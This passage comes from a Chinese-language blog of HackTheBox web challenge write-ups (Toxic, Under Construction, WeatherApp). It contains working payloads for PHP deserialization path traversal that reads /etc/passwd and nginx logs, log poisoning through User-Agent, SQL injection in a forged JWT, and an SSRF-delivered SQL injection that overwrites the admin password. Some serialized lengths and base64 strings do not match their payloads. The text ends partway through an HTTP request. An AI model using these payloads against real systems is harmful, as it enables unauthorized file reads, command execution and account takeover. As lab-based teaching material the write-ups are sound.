<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//在不可访问的属性上使用unset()时触发</span>
<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//当脚本尝试将对象调用为函数时触发</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而在本题中，出现了序列化与反序列化，同时也出现了魔术方法 ———— <code>__destruct()</code>，开搞。</p>
<h3 id="0x02-destruct-魔术方法的反序列化利用"><a href="#0x02-destruct-魔术方法的反序列化利用" class="headerlink" title="0x02 __destruct() 魔术方法的反序列化利用"></a>0x02 __destruct() 魔术方法的反序列化利用</h3><ul>
<li>首先 <code>__destruct()</code> 函数是在反序列化的过程中，也就是执行 <code>uniserialize</code> 的过程中运行的。</li>
</ul>
<p><font color=gree>__destruct()</font> 是在对象被销毁时触发。</p>
<p>那么当传进去的对象 or 参数，也就是被反序列化的参数是可控的情况下，我们可以直接修改参数，使反序列化解析出错，从而导致 <code>__destruct()</code> 被先执行，可以导致命令执行漏洞。</p>
<h3 id="0x03-回到题目，分析题目"><a href="#0x03-回到题目，分析题目" class="headerlink" title="0x03 回到题目，分析题目"></a>0x03 回到题目，分析题目</h3><h4 id="源码部分"><a href="#源码部分" class="headerlink" title="源码部分"></a>源码部分</h4><p>先看 index.php 的代码，其中最引人注目的便是 Cookie</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CookieCode.png" class="">

<p><strong>逐行分析</strong> ———— index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHPSESSID'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PageModel</span><span class="token punctuation">;</span>
 <span class="token variable">$page</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/www/index.html'</span><span class="token punctuation">;</span>  <span class="token comment">// 读取 www/index.html</span>
 <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PHPSESSID'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 先进行序列化操作，再进行 base64 编码</span>
 <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">24</span><span class="token punctuation">,</span>
 <span class="token string single-quoted-string">'/'</span>
 <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHPSESSID'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//base64 解码</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 反序列化，将字符串转换为对象</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h4 id="题目部分"><a href="#题目部分" class="headerlink" title="题目部分"></a>题目部分</h4><h5 id="1-利用-cookie"><a href="#1-利用-cookie" class="headerlink" title="(1). 利用 cookie"></a>(1). 利用 cookie</h5><ul>
<li>先抓包，获得 Cookie</li>
</ul>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CookieGet.png" class="">

<p>尝试将 Cookie 的这一串进行解码，查看一下。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ListFileName.png" class="">

<p>这里的 &#x2F;www&#x2F;index.html，尝试是否能够进行其他文件的读取，这里尝试读取 &#x2F;etc&#x2F;passwd，并且进行目录遍历的混合攻击，查看回显。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/EtcPasswd.png" class="">

<ul>
<li>base64 编码  <strong>(此处巨坑)</strong><pre class="line-numbers language-none"><code class="language-none">Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL2V0Yy9wYXNzd2QiO30&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<p>发包之后无响应，因为 &#x2F;etc&#x2F;passwd 这种文件肯定不可能在 &#x2F;www 的目录下，所以使用目录遍历攻击，逐个尝试，当目录遍历至第五层的时候成功。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"PageModel"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"../../../../etc/passwd"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

base64 的编码：Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCI7fQ<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>再发包，还是没有回显，真的坑，后来看了 WP 才知道，要把 s 的后面一个值改成 25。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"PageModel"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"../../../../etc/passwd"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

base64 的编码：
Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCI7fQ<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/nginxAccessLog.png" class="">

<p>在这一次的发包当中我们是看到了 nginx 用户的</p>
<h5 id="2-读取-nginx-用户的日志文件"><a href="#2-读取-nginx-用户的日志文件" class="headerlink" title="(2). 读取 nginx 用户的日志文件"></a>(2). 读取 nginx 用户的日志文件</h5><p>因为我们已经知道了 nginx 用户所在的位置，所以第二次的 payload 就无须再使用 <code>../</code> 来目录遍历了，直接访问 nginx 目录即可。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"PageModel"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/var/log/nginx/access.log"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

base64 编码 <span class="token operator">--</span><span class="token operator">-></span> <span class="token property">Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ</span><span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/AccessBase64Code.png" class="">
<h5 id="3-利用-User-Agent-进行命令执行"><a href="#3-利用-User-Agent-进行命令执行" class="headerlink" title="(3). 利用 User-Agent 进行命令执行"></a>(3). 利用 User-Agent 进行命令执行</h5><p>猜测 User-Agent 可以用来注入，即可以在 User-Agent 中进行命令执行，这里的 Cookie 还是使用上述的 access.log 的 payload，多发几次包(这里一定要多发几次，我真的踩坑踩死了)</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Toxicls.png" class="">

<p>这里有一个 “flag_B1lqM” 的文件，我们尝试进一步读取这一文件。此时已知 “flag_B1lqM” 的文件在 www 目录的文件夹下，所以获取 flag 文件，只需要让程序读取 flag，进行一遍序列化+反序列化的操作即可，所以构造 payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"PageModel"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/flag_B1lqM"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>

base64 编码<span class="token operator">--</span><span class="token operator">-></span>
<span class="token property">Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL2ZsYWdfQjFscU0iO30</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>GetFlag ~</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ToxicGetFlag.png" class="">
<h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><ul>
<li>题目并不算难，是基于 php 反序列化漏洞，与目录遍历漏洞相结合的一道题目。主要是会踩很多的坑 ……</li>
</ul>
<hr>
<h2 id="HackTheBox-Under-Construction"><a href="#HackTheBox-Under-Construction" class="headerlink" title="HackTheBox-Under-Construction"></a>HackTheBox-Under-Construction</h2><h3 id="0x01-前言-6"><a href="#0x01-前言-6" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>近期调整状态中……</p>
<h3 id="0x02-初识靶场-5"><a href="#0x02-初识靶场-5" class="headerlink" title="0x02 初识靶场"></a>0x02 初识靶场</h3><p>靶场界面如图所示</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/UnderConstruction.png" class="">

<p>看到这么一个登录注册的功界面，第一感还是 SQL 注入的。</p>
<p>在登录界面尝试万能密码，SQL 注入失败，转向注册界面。点击 Register 之后跳转失败，还是停留在 &#x2F;auth 界面。没找到注册界面，这里可以利用 Burpsuite 寻找目录，但是节省时间，我们直接代码审计，最后发现居然没有注册界面 ……</p>
<ul>
<li>原来就是没有注册界面的，需要我们抓包后进行修改</li>
</ul>
<p>先将 GET 请求中的参数 <code>error</code> 删除掉，再将 Referer 的参数 <code>error</code> 也删除掉，最后添加 username 与 password。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Index.png" class="">

<p>我们以 admin，123 进行注册，毕竟是 CTF 嘛，不要用 admin，admin 比较好。</p>
<p>注册进入之后的界面如图所示</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/LoginLike.png" class="">

<p>看着没什么搞头的样子，抓包看一看。发现了我们的老朋友，哟，这不是 JWT 吗 ~</p>
<p>我们先前 Login 的时候，会在 Response 响应包处产生一个 JWT，而产生的 JWT 也会应用于登录进之后界面的 Cookie，把 JWT 解密一下。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/JWTEncode.png" class="">

<ul>
<li>All Right，基本的 Web 界面运行是差不多了，是时候开始我们的下一步 ———— 代码审计了。</li>
</ul>
<h3 id="0x03-代码审计-4"><a href="#0x03-代码审计-4" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h3><p>老样子，先看路由。我个人感觉是没什么东西阿，既没有 Flag，也没有命令执行类的明显漏洞，莫非要寄了？</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/UnderConstructionRouteCode.png" class="">

<p>看着没啥东西，去到管理登录的 <strong>DBHelper.js</strong> 文件看一看，没想到居然是 SQL 语句 ~！</p>
<p>在预编译盛行的时代中，第 11 行的内容太抓我的眼球了，一看就是 SQL 注入阿！</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SQLInjectionCode.png" class="">

<p>我们定位到 getUser 的方法，看一看谁调用了它。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SQLInjectionFind.png" class="">

<p>到这里就可以确定整个题目的思路了，首先 GET 请求 <code>/</code> 时，携带利用公钥伪造的 JWT，而 JWT 中的 <code>username</code> 字段值为 SQL 注入语句，执行后就可以进入数据库查找 <code>flag</code> 了。注入点在 Cookie 中的 JWT 中的 username 哈哈哈，有点绕。</p>
<h3 id="0x04-Exploit-of-it"><a href="#0x04-Exploit-of-it" class="headerlink" title="0x04 Exploit of it"></a>0x04 Exploit of it</h3><p>这个漏洞的利用完全是脑洞题了……直接快速过了吧</p>
<ul>
<li>用到的工具：jwt_tools，Python 的 pycryptodomex</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/ticarpi/jwt_tool
pip3 <span class="token function">install</span> pycryptodomex<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/JWT_Tools.png" class="">

<p>然后就是一套的 SQL 注入即可，不难。</p>
<p>flag <code>HTB&#123;d0n7_3xp053_y0ur_publ1ck3y&#125;</code></p>
<h2 id="HackTheBox-WeatherApp"><a href="#HackTheBox-WeatherApp" class="headerlink" title="HackTheBox-WeatherApp"></a>HackTheBox-WeatherApp</h2><h3 id="0x01-靶场简单分析-2"><a href="#0x01-靶场简单分析-2" class="headerlink" title="0x01 靶场简单分析"></a>0x01 靶场简单分析</h3><p>靶场界面如图所示</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WeatherApp.png" class="">

<p>提示语是很长一段，翻译过来之后如图</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Translation.png" class="">

<ul>
<li>中间有一段话引人注目</li>
<li>This weather application is notorious for trapping the souls of ambitious weathermen like me.</li>
<li>这里有点感觉，这个网站应该是钓鱼的网站，通过天气预报钓鱼。</li>
</ul>
<p>再分析一下，它这里的 ublock 会把一部分给 block 掉。关闭 ublock，再刷新一下网站看看是否有奇效。<br>呃，怪怪的。打开 f12 之后，边上又出现了更怪的</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/UnknownIndex.png" class="">

<h3 id="0x02-开打"><a href="#0x02-开打" class="headerlink" title="0x02 开打"></a>0x02 开打</h3><p>面对这么一个奇怪的网站，必然是先扫描目录了 ~ 扫出来了一个登录注册界面，运气还可以噢，上去康康。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Lists.png" class="">

<h4 id="登录界面尝试"><a href="#登录界面尝试" class="headerlink" title="登录界面尝试"></a>登录界面尝试</h4><p>在登录界面，一开始是使用 123 登录的，登录后回显为 “You are not admin”。嗯，感觉用户名是 admin，而且 admin 拥有较高的权限，是本题破解的核心所在。而不论输入任何 username 都会被保存，有点 shiro 的感觉。</p>
<p>尝试用 admin 登录，回显如下图所示</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/AdminBack.png" class="">


<ul>
<li>爆破的闲暇时间尝试一下是否存在 SQL 注入，说实话在输入 admin 之后就感觉不存在 SQL 注入了，感觉更像 shiro 的工作方式。</li>
<li>尝试 SQL 注入，失败，回到 register 界面康康。</li>
</ul>
<h4 id="注册界面尝试"><a href="#注册界面尝试" class="headerlink" title="注册界面尝试"></a>注册界面尝试</h4><p>一般来说如果登陆界面不存在 SQL 注入的话，可以多试试 register 注册界面。原因详见 —————— <a class="link"   target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/03/17/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-02-SQL%E6%B3%A8%E5%85%A5/#toc-heading-24" >注册界面的 SQL 注入<i class="fas fa-external-link-alt"></i></a></p>
<p>让我没想到的是，注册界面直接 401 了………………</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Error401Register.png" class="">

<p>而且报错之后会直接返回到 login 的界面 ………… 匪夷所思</p>
<ul>
<li>爆破的结果也出来了，寄</li>
</ul>
<hr>
<hr>
<p>看到题目中的附件，下载下来看一看。然后就直接看到了 flag 哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈哈笑死，但肯定不能这么做。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WeatherAppflag.png" class="">

<p>这里移步至 “index.js” 的界面下，这里面是一堆判断的东西。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/Judge.png" class="">

<ul>
<li><p>第 19 行 – 第 34 行，很清楚得解释了为什么注册的时候会是返回 401 的状态码。</p>
</li>
<li><p>第 36 行 – 第 53 行，审计登录界面，并获取 flag</p>
</li>
<li><p>针对上述问题，逐一审计并破解</p>
</li>
</ul>
<h2 id="0x03-代码审计-5"><a href="#0x03-代码审计-5" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h2><h3 id="1-审计获取-flag-的条件"><a href="#1-审计获取-flag-的条件" class="headerlink" title="1. 审计获取 flag 的条件"></a>1. 审计获取 flag 的条件</h3><p>先把获取 flag 的代码单独贴出来</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/FlagCondition.png" class="">
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
router<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">.</span>sendFile<span class="token punctuation">(</span>path<span class="token punctuation">.</span>resolve<span class="token punctuation">(</span><span class="token string">'views/login.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
router<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
	let <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">&amp;</span><span class="token operator">&amp;</span> password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 		<span class="token keyword">return</span> db<span class="token punctuation">.</span>isAdmin<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>
			<span class="token punctuation">.</span>then<span class="token punctuation">(</span>admin <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>admin<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span>send<span class="token punctuation">(</span>fs<span class="token punctuation">.</span>readFileSync<span class="token punctuation">(</span><span class="token string">'/app/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> res<span class="token punctuation">.</span>send<span class="token punctuation">(</span>response<span class="token punctuation">(</span><span class="token string">'You are not admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 			<span class="token punctuation">.</span>catch<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> res<span class="token punctuation">.</span>send<span class="token punctuation">(</span>response<span class="token punctuation">(</span><span class="token string">'Something went wrong'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span>
 	<span class="token keyword">return</span> re<span class="token punctuation">.</span>send<span class="token punctuation">(</span>response<span class="token punctuation">(</span><span class="token string">'Missing parameters'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>获取 flag 的条件：成为 admin 用户</li>
</ul>
<p>再回去寻找成为 admin 用户的条件，这里主要两种方式吧，分为原本的数据库当中是否存在 admin 用户。</p>
<h4 id="如果数据库不存在-admin-用户"><a href="#如果数据库不存在-admin-用户" class="headerlink" title="如果数据库不存在 admin 用户"></a>如果数据库不存在 admin 用户</h4><p>如果数据库是不存在 admin 用户的话，需要靠注册来实现，注册一个名为 admin 的账户。而在之前，代码审计的时候发现注册的过程当中会存在 401 的情况。</p>
<blockquote>
<p>所以如果数据库当中不存在 admin 用户的话，需要去审计注册界面的，感觉是存在 SSRF</p>
</blockquote>
<h4 id="如果数据库存在-admin-用户"><a href="#如果数据库存在-admin-用户" class="headerlink" title="如果数据库存在 admin 用户"></a>如果数据库存在 admin 用户</h4><p>那这里就感觉是 SQL 注入了，想办法把 admin 的密码爆出来，或者是通过联合查询的方式篡改密码。</p>
<hr>
<ul>
<li>进一步分析，看一看 admin 到底在哪儿。</li>
</ul>
<h3 id="2-审计查找-admin"><a href="#2-审计查找-admin" class="headerlink" title="2. 审计查找 admin"></a>2. 审计查找 admin</h3><p>在文件夹中寻找到了 database.js 这个文件，感觉是突破口，代码审计一下。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/AdminExist.png" class="">

<ul>
<li>其中的数据库操作，第 24 行，里面的语句表明数据库里面已存在 admin 这一账户了<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> users <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'$&#123; crypto.randomBytes(32).toString('</span>hex'<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
同时密码是随机生成的，我们想要通过正常的暴力破解是没有用的，剩下的就是通过注入的方式获取密码。</li>
</ul>
<p>来看到 Register 这里的判断，对输入的 username 和 password 并没有进行处理。</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/InjectioNoDefense.png" class="">

<p>再康康判断 admin 的函数 “isadmin”</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/isAdmin.png" class="">

<p>我们想要成为 admin 用户，就必须知道 admin 用户的密码，而且注入点也是已知的了，在 Register 地方，其实之前的思路也算是正确了一部分，但是被 Register 的 401 给拦截掉了，应该早点想到 SSRF 的。</p>
<h3 id="3-寻找可攻击的-SSRF-点"><a href="#3-寻找可攻击的-SSRF-点" class="headerlink" title="3. 寻找可攻击的 SSRF 点"></a>3. 寻找可攻击的 SSRF 点</h3><p>到 helpers 文件夹里面找，发现 “weatherData” 是可控的，此处存在 SSRF。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> weatherData <span class="token operator">=</span> <span class="token keyword">await</span> HttpHelper<span class="token punctuation">.</span><span class="token function">HttpGet</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>endpoint<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/data/2.5/weather?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>city<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>country<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;units=metric&amp;appid=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>apiKey<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>再回去找这个函数 “HttpHelper” 的方法 HttpGet</p>
<img src="/2022/07/20/HackTheBox%E4%B9%8BWeb%E9%83%A8%E5%88%86%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/SSRFsee.png" class="">

<ul>
<li>辗转多次，发现让我们在 &#x2F;api&#x2F;weather 里面构造 SSRF，通过 SSRF 访问 Register 接口，在 Register 接口处进行 SQL 注入。</li>
</ul>
<p>构造 SQL 语句的 payload</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&#39;)
password&#x3D;1&#39;) ON CONFLICT(username) DO UPDATE SET password &#x3D; &#39;admin&#39;;--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>构造完 SQL 注入的语句过后，下一步就是 SSRF 了。</li>
</ul>
<p>修改 host 为 127.0.0.1，构造 SSRF</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/register</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">87</span></span>
